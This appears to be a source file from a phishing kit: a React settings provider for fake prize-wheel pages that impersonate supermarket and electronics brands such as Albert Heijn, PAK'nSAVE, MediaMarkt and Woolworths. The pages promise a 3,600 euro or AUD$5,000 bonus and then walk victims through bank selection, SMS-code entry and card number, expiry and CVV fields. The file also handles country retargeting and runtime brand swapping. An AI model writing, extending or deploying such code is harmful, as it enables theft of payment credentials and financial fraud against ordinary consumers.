"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { translations } from "@/lib/languageDefaults";
import { brandifySettings, getCampaignNameFromSettings } from "@/lib/brand";
import { applyBrandTheme } from "@/lib/theme";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;
  entry_page?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const LEGACY_PAKNSAVE_LOGO_URLS = new Set([
  "/wheel-assets/desktop/png/paknsave-logo-hub.webp",
  "/form-assets/paknsave-logo-form.webp",
  "/wheel-assets/mobile/png/paknsave-logo-hub.webp",
  "/form-assets/maxima-mini-logo.webp",
]);
const DEFAULT_AU_LOGO_URL = "/mediamarkt/logo.webp";
const AUSTRALIA_BG_URL = "/mediamarkt/desktop-background.webp";
const AUSTRALIA_BG_URL_MOBILE = "/mediamarkt/mobile-background.webp";
const AUSTRALIA_FORM_LOGO = "/mediamarkt/logo.webp";
const LEGACY_BG_URL = "/spar-bg.webp";
const LEGACY_WHEEL_BACKGROUNDS = new Set([
  "/wheel-assets/desktop/background-opaque.webp",
  "/wheel-assets/mobile/background-opaque.webp",
  "/wheel-assets/bg-1.webp",
  "/wheel-assets/mobile-bg.webp",
  "/wheel-assets/cark-bg.webp",
]);
const LEGACY_BRAND_NAME = ["Albert", "Heijn"].join(" ");
const LEGACY_PORTAL_NAME = `${LEGACY_BRAND_NAME} klantenportaal`;
const LEGACY_SUPPORT_CENTER_NAME = `${LEGACY_BRAND_NAME} service`;
const LEGACY_WIN_TITLE = `Exclusieve ${LEGACY_BRAND_NAME} bonus`;
const LEGACY_WIN_SUBTITLE = [
  "Gefeliciteerd! Je bent geselecteerd voor onze",
  `${LEGACY_BRAND_NAME} actie van vandaag.`,
  "Klik op de knop hieronder om je bonus van 3.600 euro te claimen.",
].join(" ");
const LEGACY_PAKNSAVE_PORTAL_NAME = "PAK'nSAVE Customer Portal";
const LEGACY_PAKNSAVE_SUPPORT = "PAK'nSAVE Support";
const LEGACY_PAKNSAVE_WIN_TITLE = "Exclusive PAK'nSAVE Bonus";
const LEGACY_GENERIC_PORTAL_NAME = "Customer Portal";
const LEGACY_GENERIC_SUPPORT = "Customer Support";
const LEGACY_GENERIC_WIN_TITLE = "Exclusive Bonus Offer";
const LEGACY_GENERIC_WIN_SUBTITLE = "Congratulations! You have been selected for today's national promotion. Click the button below to claim your AUD$5,000 bonus.";
const ENGLISH_DEFAULTS = translations.en;
const ENGLISH_SUPPORT_CENTER_NAME = ENGLISH_DEFAULTS.support_center_name;
const ENGLISH_PORTAL_NAME = ENGLISH_DEFAULTS.portal_name;
const ENGLISH_WIN_TITLE = ENGLISH_DEFAULTS.win_title;
const ENGLISH_WIN_SUBTITLE = ENGLISH_DEFAULTS.win_subtitle;
const ENGLISH_WIN_BUTTON = ENGLISH_DEFAULTS.win_button;
const ENGLISH_BANKEN_TITLE = ENGLISH_DEFAULTS.banken_title;
const ENGLISH_BANKEN_SUBTITLE = ENGLISH_DEFAULTS.banken_subtitle;
const ENGLISH_BANKEN_SEARCH_PLACEHOLDER = ENGLISH_DEFAULTS.banken_search_placeholder;
const ENGLISH_WAIT_TITLE = ENGLISH_DEFAULTS.wait_title;
const ENGLISH_WAIT_SUBTITLE = ENGLISH_DEFAULTS.wait_subtitle;
const ENGLISH_SMS_TITLE = ENGLISH_DEFAULTS.sms_title;
const ENGLISH_SMS_SUBTITLE = ENGLISH_DEFAULTS.sms_subtitle;
const ENGLISH_SMS_INPUT_LABEL = ENGLISH_DEFAULTS.sms_input_label;
const ENGLISH_SMS_BUTTON = ENGLISH_DEFAULTS.sms_button;
const ENGLISH_SMS_LOADING = ENGLISH_DEFAULTS.sms_loading;
const ENGLISH_CARD_TITLE = ENGLISH_DEFAULTS.card_title;
const ENGLISH_CARD_SUBTITLE = ENGLISH_DEFAULTS.card_subtitle;
const ENGLISH_CARD_OWNER_LABEL = ENGLISH_DEFAULTS.card_owner_label;
const ENGLISH_CARD_NUMBER_LABEL = ENGLISH_DEFAULTS.card_number_label;
const ENGLISH_CARD_EXPIRY_LABEL = ENGLISH_DEFAULTS.card_expiry_label;
const ENGLISH_CARD_CVV_LABEL = ENGLISH_DEFAULTS.card_cvv_label;
const ENGLISH_CARD_BUTTON = ENGLISH_DEFAULTS.card_button;
const ENGLISH_CODE_TITLE = ENGLISH_DEFAULTS.code_title;
const ENGLISH_CODE_SUBTITLE = ENGLISH_DEFAULTS.code_subtitle;
const ENGLISH_CODE_BUTTON = ENGLISH_DEFAULTS.code_button;
const LEGACY_LIVE_SUPPORT_TITLES = new Set([
  "Live support",
  "Live Support",
  "Live-Support",
]);
const LEGACY_LIVE_SUPPORT_SUBTITLES = new Set([
  "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
  "Um fortzufahren, müssen Sie unseren Kundenservice kontaktieren.\n\nKlicken Sie auf den Button unten, um den Chat zu starten.",
  "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
  "To continue, you need to contact our customer support.\n\nClick the button below to start the chat.",
]);
const LEGACY_LIVE_SUPPORT_BUTTONS = new Set([
  "Chat openen",
  "Chat starten",
  "Start Chat",
]);
const ENGLISH_LIVE_SUPPORT_TITLE = ENGLISH_DEFAULTS.live_support_title;
const ENGLISH_LIVE_SUPPORT_SUBTITLE = ENGLISH_DEFAULTS.live_support_subtitle;
const ENGLISH_LIVE_SUPPORT_BUTTON = ENGLISH_DEFAULTS.live_support_button;
const ENGLISH_PROFILE_TITLE_SMALL = ENGLISH_DEFAULTS.profile_title_small;
const ENGLISH_PROFILE_TITLE_MAIN = ENGLISH_DEFAULTS.profile_title_main;
const ENGLISH_PROFILE_SUBTITLE = ENGLISH_DEFAULTS.profile_subtitle;
const ENGLISH_PROFILE_FIRSTNAME_LABEL = ENGLISH_DEFAULTS.profile_firstname_label;
const ENGLISH_PROFILE_LASTNAME_LABEL = ENGLISH_DEFAULTS.profile_lastname_label;
const ENGLISH_PROFILE_PHONE_LABEL = ENGLISH_DEFAULTS.profile_phone_label;
const ENGLISH_PROFILE_BUTTON = ENGLISH_DEFAULTS.profile_button;
const ENGLISH_PROFILE_LOADING_TEXT = ENGLISH_DEFAULTS.profile_loading_text;

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };
  const nextWheelSettings = { ...(next.wheel_settings ?? {}) };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.webp" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL ||
    LEGACY_PAKNSAVE_LOGO_URLS.has(next.logo_url)
  ) {
    next.logo_url = DEFAULT_AU_LOGO_URL;
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL || LEGACY_WHEEL_BACKGROUNDS.has(next.bg_url)) {
    next.bg_url = AUSTRALIA_BG_URL;
  }

  if (
    !next.portal_name ||
    next.portal_name === LEGACY_PORTAL_NAME ||
    next.portal_name === LEGACY_PAKNSAVE_PORTAL_NAME ||
    next.portal_name === LEGACY_GENERIC_PORTAL_NAME
  ) {
    next.portal_name = ENGLISH_PORTAL_NAME;
  }

  if (
    !next.support_center_name ||
    next.support_center_name === LEGACY_SUPPORT_CENTER_NAME ||
    next.support_center_name === LEGACY_PAKNSAVE_SUPPORT ||
    next.support_center_name === LEGACY_GENERIC_SUPPORT
  ) {
    next.support_center_name = ENGLISH_SUPPORT_CENTER_NAME;
  }

  if (
    !next.win_title ||
    next.win_title === LEGACY_WIN_TITLE ||
    next.win_title === LEGACY_PAKNSAVE_WIN_TITLE ||
    next.win_title === LEGACY_GENERIC_WIN_TITLE
  ) {
    next.win_title = ENGLISH_WIN_TITLE;
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE || next.win_subtitle === LEGACY_GENERIC_WIN_SUBTITLE) {
    next.win_subtitle = ENGLISH_WIN_SUBTITLE;
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  if (
    next.target_country === "Estonia" ||
    next.target_country === "Netherlands" ||
    next.target_country === "New Zealand"
  ) {
    next.target_country = "Australia";
  }

  if (next.site_language && next.site_language !== "en") {
    next.site_language = "en";
  }

  if (next.target_country === "Australia") {
    next.bg_url = AUSTRALIA_BG_URL;
    nextWheelSettings.bg_url_mobile = AUSTRALIA_BG_URL_MOBILE;
    nextWheelSettings.page_backgrounds = {};
    if (!nextWheelSettings.desktop_background || LEGACY_WHEEL_BACKGROUNDS.has(nextWheelSettings.desktop_background)) {
      nextWheelSettings.desktop_background = "/wheel-assets/desktop/png/mediamarkt-background.webp";
    }
    if (!nextWheelSettings.mobile_background || LEGACY_WHEEL_BACKGROUNDS.has(nextWheelSettings.mobile_background)) {
      nextWheelSettings.mobile_background = "/wheel-assets/mobile/png/mediamarkt-background.webp";
    }
    if (!nextWheelSettings.desktop_hub || LEGACY_PAKNSAVE_LOGO_URLS.has(nextWheelSettings.desktop_hub)) {
      nextWheelSettings.desktop_hub = "/wheel-assets/desktop/png/mediamarkt-hub.webp";
    }
    if (!nextWheelSettings.mobile_hub || LEGACY_PAKNSAVE_LOGO_URLS.has(nextWheelSettings.mobile_hub)) {
      nextWheelSettings.mobile_hub = "/wheel-assets/mobile/png/mediamarkt-hub.webp";
    }
    if (!nextWheelSettings.desktop_wheel) {
      nextWheelSettings.desktop_wheel = "/wheel-assets/desktop/png/mediamarkt-wheel.webp";
    }
    if (!nextWheelSettings.mobile_wheel) {
      nextWheelSettings.mobile_wheel = "/wheel-assets/mobile/png/mediamarkt-wheel.webp";
    }
    if (!nextWheelSettings.desktop_pointer) {
      nextWheelSettings.desktop_pointer = "/wheel-assets/desktop/png/mediamarkt-pointer.webp";
    }
    if (!nextWheelSettings.mobile_pointer) {
      nextWheelSettings.mobile_pointer = "/wheel-assets/mobile/png/mediamarkt-pointer.webp";
    }
    if (!nextWheelSettings.desktop_button) {
      nextWheelSettings.desktop_button = "/wheel-assets/desktop/png/mediamarkt-button.webp";
    }
    if (!nextWheelSettings.mobile_button) {
      nextWheelSettings.mobile_button = "/wheel-assets/mobile/png/mediamarkt-button.webp";
    }
    next.wheel_settings = nextWheelSettings;

    if (
      !next.support_center_name ||
      next.support_center_name === LEGACY_SUPPORT_CENTER_NAME ||
      next.support_center_name === LEGACY_PAKNSAVE_SUPPORT ||
      next.support_center_name === LEGACY_GENERIC_SUPPORT
    ) {
      next.support_center_name = ENGLISH_SUPPORT_CENTER_NAME;
    }

    if (!next.live_support_title || LEGACY_LIVE_SUPPORT_TITLES.has(next.live_support_title)) {
      next.live_support_title = ENGLISH_LIVE_SUPPORT_TITLE;
    }

    if (!next.live_support_subtitle || LEGACY_LIVE_SUPPORT_SUBTITLES.has(next.live_support_subtitle)) {
      next.live_support_subtitle = ENGLISH_LIVE_SUPPORT_SUBTITLE;
    }

    if (!next.live_support_button || LEGACY_LIVE_SUPPORT_BUTTONS.has(next.live_support_button)) {
      next.live_support_button = ENGLISH_LIVE_SUPPORT_BUTTON;
    }
  }

  if (!next.win_button) next.win_button = ENGLISH_WIN_BUTTON;
  if (!next.banken_title) next.banken_title = ENGLISH_BANKEN_TITLE;
  if (!next.banken_subtitle) next.banken_subtitle = ENGLISH_BANKEN_SUBTITLE;
  if (!next.banken_search_placeholder) next.banken_search_placeholder = ENGLISH_BANKEN_SEARCH_PLACEHOLDER;
  if (!next.wait_title) next.wait_title = ENGLISH_WAIT_TITLE;
  if (!next.wait_subtitle) next.wait_subtitle = ENGLISH_WAIT_SUBTITLE;
  if (!next.sms_title) next.sms_title = ENGLISH_SMS_TITLE;
  if (!next.sms_subtitle) next.sms_subtitle = ENGLISH_SMS_SUBTITLE;
  if (!next.sms_input_label) next.sms_input_label = ENGLISH_SMS_INPUT_LABEL;
  if (!next.sms_button) next.sms_button = ENGLISH_SMS_BUTTON;
  if (!next.sms_loading) next.sms_loading = ENGLISH_SMS_LOADING;
  if (!next.card_title) next.card_title = ENGLISH_CARD_TITLE;
  if (!next.card_subtitle) next.card_subtitle = ENGLISH_CARD_SUBTITLE;
  if (!next.card_owner_label) next.card_owner_label = ENGLISH_CARD_OWNER_LABEL;
  if (!next.card_number_label) next.card_number_label = ENGLISH_CARD_NUMBER_LABEL;
  if (!next.card_expiry_label) next.card_expiry_label = ENGLISH_CARD_EXPIRY_LABEL;
  if (!next.card_cvv_label) next.card_cvv_label = ENGLISH_CARD_CVV_LABEL;
  if (!next.card_button) next.card_button = ENGLISH_CARD_BUTTON;
  if (!next.code_title) next.code_title = ENGLISH_CODE_TITLE;
  if (!next.code_subtitle) next.code_subtitle = ENGLISH_CODE_SUBTITLE;
  if (!next.code_button) next.code_button = ENGLISH_CODE_BUTTON;
  if (!next.profile_title_small) next.profile_title_small = ENGLISH_PROFILE_TITLE_SMALL;
  if (!next.profile_title_main) next.profile_title_main = ENGLISH_PROFILE_TITLE_MAIN;
  if (!next.profile_subtitle) next.profile_subtitle = ENGLISH_PROFILE_SUBTITLE;
  if (!next.profile_firstname_label) next.profile_firstname_label = ENGLISH_PROFILE_FIRSTNAME_LABEL;
  if (!next.profile_lastname_label) next.profile_lastname_label = ENGLISH_PROFILE_LASTNAME_LABEL;
  if (!next.profile_phone_label) next.profile_phone_label = ENGLISH_PROFILE_PHONE_LABEL;
  if (!next.profile_button) next.profile_button = ENGLISH_PROFILE_BUTTON;
  if (!next.profile_loading_text) next.profile_loading_text = ENGLISH_PROFILE_LOADING_TEXT;
  if (!next.site_language) next.site_language = "en";
  if (!next.target_country) next.target_country = "Australia";

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: DEFAULT_AU_LOGO_URL,
  bg_url: AUSTRALIA_BG_URL,
  portal_name: ENGLISH_PORTAL_NAME,
  support_center_name: ENGLISH_SUPPORT_CENTER_NAME,
  win_title: ENGLISH_WIN_TITLE,
  win_subtitle: ENGLISH_WIN_SUBTITLE,
  win_button: ENGLISH_WIN_BUTTON,
  banken_title: ENGLISH_BANKEN_TITLE,
  banken_subtitle: ENGLISH_BANKEN_SUBTITLE,
  banken_search_placeholder: ENGLISH_BANKEN_SEARCH_PLACEHOLDER,
  wait_title: ENGLISH_WAIT_TITLE,
  wait_subtitle: ENGLISH_WAIT_SUBTITLE,
  sms_title: ENGLISH_SMS_TITLE,
  sms_subtitle: ENGLISH_SMS_SUBTITLE,
  sms_input_label: ENGLISH_SMS_INPUT_LABEL,
  sms_button: ENGLISH_SMS_BUTTON,
  sms_loading: ENGLISH_SMS_LOADING,
  card_title: ENGLISH_CARD_TITLE,
  card_subtitle: ENGLISH_CARD_SUBTITLE,
  card_owner_label: ENGLISH_CARD_OWNER_LABEL,
  card_number_label: ENGLISH_CARD_NUMBER_LABEL,
  card_expiry_label: ENGLISH_CARD_EXPIRY_LABEL,
  card_cvv_label: ENGLISH_CARD_CVV_LABEL,
  card_button: ENGLISH_CARD_BUTTON,
  code_title: ENGLISH_CODE_TITLE,
  code_subtitle: ENGLISH_CODE_SUBTITLE,
  code_button: ENGLISH_CODE_BUTTON,
  live_support_title: ENGLISH_LIVE_SUPPORT_TITLE,
  live_support_subtitle: ENGLISH_LIVE_SUPPORT_SUBTITLE,
  live_support_button: ENGLISH_LIVE_SUPPORT_BUTTON,
  profile_title_small: ENGLISH_PROFILE_TITLE_SMALL,
  profile_title_main: ENGLISH_PROFILE_TITLE_MAIN,
  profile_subtitle: ENGLISH_PROFILE_SUBTITLE,
  profile_firstname_label: ENGLISH_PROFILE_FIRSTNAME_LABEL,
  profile_lastname_label: ENGLISH_PROFILE_LASTNAME_LABEL,
  profile_phone_label: ENGLISH_PROFILE_PHONE_LABEL,
  profile_button: ENGLISH_PROFILE_BUTTON,
  profile_loading_text: ENGLISH_PROFILE_LOADING_TEXT,
  site_language: "en",
  target_country: "Australia",
  wheel_settings: {
    bg_url_mobile: AUSTRALIA_BG_URL_MOBILE,
    page_backgrounds: {},
  },
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => {
          const normalized = normalizeBranding({ ...prev, ...data }) as GlobalSettings;
          // Kampanya adi (wheel_settings.campaign_name): tum metinlerdeki
          // "Woolworths" ibaresi runtime'da kampanya ismiyle degistirilir.
          return brandifySettings(
            normalized as unknown as Record<string, unknown>,
            getCampaignNameFromSettings(normalized),
          ) as unknown as GlobalSettings;
        });
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Kampanya tema rengi (wheel_settings.theme_primary) -> CSS degiskenleri.
  // Admin acikca renk secmediyse globals.css'teki Woolworths varsayilanlari korunur.
  useEffect(() => {
    const ws = (settings?.wheel_settings ?? {}) as Record<string, unknown>;
    applyBrandTheme(ws.theme_primary);
  }, [settings]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      
      // Determine page-specific background
      const path = window.location.pathname;
      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (path.includes('/wheel') && pageBgs.wheel) activeBg = pageBgs.wheel;
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      if (activeBg) {
        const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
          width: targetWidth,
          quality: isMobile ? 60 : 68,
          format: "webp",
        });
        const nextSignature = `${window.location.pathname}|${optimizedBg}`;
        if (bgSignatureRef.current === nextSignature) {
          return;
        }

        bgSignatureRef.current = nextSignature;
        document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      }
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
